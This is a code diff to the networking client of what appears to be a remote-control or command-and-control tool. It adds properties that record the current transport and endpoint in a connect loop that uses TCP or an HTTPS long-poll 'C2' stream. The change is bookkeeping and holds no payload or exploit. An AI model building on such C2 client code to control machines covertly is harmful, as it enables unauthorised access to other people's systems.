@@ -51,15 +51,25 @@ namespace Pulsar.Client.Networking
         /// </summary>
         private readonly CancellationToken _token;
 
-    /// <summary>
-    /// Indicates that shutdown was requested for the connect loop.
-    /// </summary>
-    private volatile bool _shutdownRequested;
+        /// <summary>
+        /// Indicates that shutdown was requested for the connect loop.
+        /// </summary>
+        private volatile bool _shutdownRequested;
 
-    /// <summary>
-    /// Tracks whether the instance was disposed to avoid double cleanup.
-    /// </summary>
-    private bool _disposed;
+        /// <summary>
+        /// Tracks whether the instance was disposed to avoid double cleanup.
+        /// </summary>
+        private bool _disposed;
+
+        /// <summary>
+        /// Tracks the transport used for the current connection attempt.
+        /// </summary>
+        public TransportKind CurrentTransport { get; private set; } = TransportKind.Tcp;
+
+        /// <summary>
+        /// Human-readable endpoint used for the current connection attempt.
+        /// </summary>
+        public string CurrentEndpoint { get; private set; } = string.Empty;
 
         /// <summary>
         /// Initializes a new instance of the <see cref="PulsarClient"/> class.
@@ -115,6 +125,9 @@ namespace Pulsar.Client.Networking
 
                     try
                     {
+                        CurrentTransport = host.Transport;
+                        CurrentEndpoint = host.Hostname + ":" + host.Port;
+
                         if (host.Transport == TransportKind.Tcp)
                         {
                             if (host.IpAddress == null)
@@ -123,6 +136,7 @@ namespace Pulsar.Client.Networking
                                 continue;
                             }
 
+                            CurrentEndpoint = host.IpAddress + ":" + host.Port;
                             base.Connect(host.IpAddress, host.Port);
                         }
                         else if (host.Transport == TransportKind.HttpsLongPoll)
@@ -204,6 +218,7 @@ namespace Pulsar.Client.Networking
                 }
             }
 
+            CurrentEndpoint = builder.Uri.ToString();
             var stream = new HttpC2ClientStream(builder.Uri);
             AttachStream(stream);
         }
